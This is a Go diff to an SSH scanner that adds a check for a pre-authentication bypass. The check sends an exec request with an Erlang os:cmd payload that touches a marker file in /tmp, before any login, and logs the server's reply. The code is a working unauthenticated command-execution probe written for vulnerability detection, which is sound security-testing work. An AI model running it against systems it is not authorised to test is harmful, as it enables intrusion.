@@ -3,6 +3,7 @@ package cmd
 import (
 	"net"
 	"strings"
+	"time"
 
 	"github.com/runZeroInc/excrypto/x/crypto/ssh"
 	"github.com/runZeroInc/sshamble/auth"
@@ -155,6 +156,48 @@ func sshCheckSkipAuthSuccess(addr string, conf *ScanConfig, options *auth.Option
 	return nil
 }
 
+const checkSkipAuthExec = "skip-auth-exec"
+
+func sshCheckSkipAuthExec(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
+	tname := checkSkipAuthExec
+	if !conf.IsCheckEnabled(tname) {
+		return nil
+	}
+
+	conf.Logger.Debugf("%s %s is running for user %s", addr, tname, options.Username)
+
+	cb := func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
+		_ = c.SetDeadline(time.Now().Add(time.Second * 15))
+		raw := uac.BuildChannelOpen(0, "session", nil)
+		uac.WriteRaw(raw, false)
+
+		raw = uac.BuildChannelRequest(0, "exec", []byte(`os:cmd("touch /tmp/ZZZZZZZZZZZZZZZZZZZZZZZZZZZ").`), true)
+		uac.WriteRaw(raw, false)
+		for {
+			reply, err := uac.ReadRaw()
+			conf.Logger.Warnf("%s %s got %#v (%s) (%v)", addr, tname, reply, string(reply), err)
+			if err != nil {
+				break
+			}
+		}
+		return nil
+	}
+
+	options = options.WithSkipStages("ssh-userauth", "auth").WithIgnoreAuthError().WithPostAuthHandler(cb)
+
+	res := auth.SSHAuth(addr, options, auth.SSHAuthHandlerSingle(ssh.None()))
+	if bypassAtInterestingStage(tname, addr, conf, res) {
+		conf.Logger.Warnf("%s %s provided exec output without authentication '%s': %s", addr, tname, res.Stage, res.SessionOutput)
+		res.SessionMethod = tname
+		root.SessionMethod = tname
+		root.SessionMethod = tname
+		root.SessionOutput = res.SessionOutput
+		root.ExitStatus = res.ExitStatus
+		return res
+	}
+	return nil
+}
+
 const checkSkipAuthMethodEmpty = "skip-auth-method-empty"
 
 func sshCheckSkipAuthMethodEmpty(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
@@ -219,6 +262,7 @@ func initBypassChecks() {
 	registerCheck(checkSkipAuthNone, "bypass", false, true)
 	registerCheck(checkSkipAuthPubkeyAny, "bypass", false, true)
 	registerCheck(checkSkipAuthSuccess, "bypass", false, true)
+	registerCheck(checkSkipAuthExec, "bypass", false, true)
 	registerCheck(checkSkipAuthMethodEmpty, "bypass", false, true)
 	registerCheck(checkSkipAuthMethodNull, "bypass", false, true)
 }
